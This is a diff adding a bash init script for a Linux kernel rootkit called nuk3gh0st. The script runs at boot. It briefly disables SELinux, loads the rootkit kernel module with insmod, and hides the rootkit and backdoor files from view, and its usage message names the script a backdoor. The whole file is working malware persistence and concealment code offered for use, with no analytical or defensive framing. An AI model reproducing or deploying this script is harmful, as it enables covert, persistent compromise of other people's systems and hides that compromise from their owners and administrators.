@@ -1,0 +1,108 @@
+#!/bin/bash
+
+### BEGIN INIT INFO
+# Provides:          nuk3gh0st.startup
+# Required-Start:    networking
+# Required-Stop:     networking
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: nuk3gh0st service
+# Description:       Run nuk3gh0st service
+### END INIT INFO
+
+green='\e[0;32m'
+red='\e[0;31m'
+purple='\e[0;35m'
+yellow='\e[0;33m'
+cyan='\e[0;36m'
+endColor='\e[0m'
+item=${green}[*]${endColor}
+
+function enable_selinux {
+	#echo -e "${item} Reenabling SELINUX"
+	#echo -e "   ${purple} cmd: setenforce 1${endColor}"
+	setenforce 1
+        #echo ""
+}
+
+function disable_selinux {
+	#echo -e "${item} Disabling SELINUX temporarily"
+	#echo -e "   ${purple} cmd: setenforce 0${endColor}"
+	setenforce 0
+	#echo ""
+}
+
+function load_rootkit {
+	#echo -e "${item} Loading nuk3gh0st LKM rootkit"
+	#echo -e "   ${purple} cmd: insmod /usr/share/nuk3gh0st/rootkit.ko${endColor}"
+	insmod /usr/share/nuk3gh0st/rootkit.ko
+	#echo ""
+}
+
+function hide_rootkit_files {
+	#echo -e "${item} Hidding nuk3gh0st files"
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rootkit.ko${endColor}"
+        #nuk3gh0st --hide-file=rootkit.ko
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st${endColor}"
+        #nuk3gh0st --hide-file=nuk3gh0st
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=load-nuk3gh0st${endColor}"
+        #nuk3gh0st --hide-file=load-nuk3gh0st
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=unload-nuk3gh0st${endColor}"
+        #nuk3gh0st --hide-file=unload-nuk3gh0st
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=startup-nuk3gh0st${endColor}"
+        #nuk3gh0st --hide-file=enable-nuk3gh0st
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rmstartup-nuk3gh0st${endColor}"
+        #nuk3gh0st --hide-file=disable-nuk3gh0st
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
+        #nuk3gh0st --hide-file=nuk3gh0st.startup
+        #echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
+        #nuk3gh0st --hide-file=nuk3gh0st.service
+	#echo -e "   ${purple} cmd: nuk3gh0st --hide-file=S98nuk3gh0st.startup${endColor}"
+        #nuk3gh0st --hide-file=S98nuk3gh0st.startup
+	#nuk3gh0st --hide-file=S99backdoor
+	#nuk3gh0st --hide-file=backdoor
+	#nuk3gh0st --hide-file=backdoor-generator
+	#nuk3gh0st --hide-file=backdoor.service
+	nuk3gh0st --hide-file=nuk3gh0st
+	nuk3gh0st --hide-file=rootkit
+	nuk3gh0st --hide-file=backdoor
+	
+        #echo ""
+
+        #echo -e "${yellow}WARNING: you won't be able to see the installation folder"
+        #echo -e "until you unload the rootkit, but it will still exist "
+        #echo -e "and you can access to it if you remember the path${endColor}"
+        #echo ""
+}
+
+
+
+case "$1" in
+	start)
+		#echo -e "${item} Checking if SELINUX is enabled..."
+		if [ -f /usr/sbin/setenforce ]; then
+			#echo -e "${item} SELINUX is enabled"
+			disable_selinux       
+			load_rootkit
+			hide_rootkit_files
+		      	enable_selinux  
+		else 
+			#echo -e "${item} SELINUX is disabled"
+		       	load_rootkit
+			hide_rootkit_files
+		fi
+		;;
+	stop)
+		;;
+	restart)
+		;;
+	force-reload)
+		;;
+	status)
+		;;
+	*)
+		echo "Usage: /etc/init.d/backdoor {start|stop}"
+		exit 1
+		;;
+esac
+exit 0
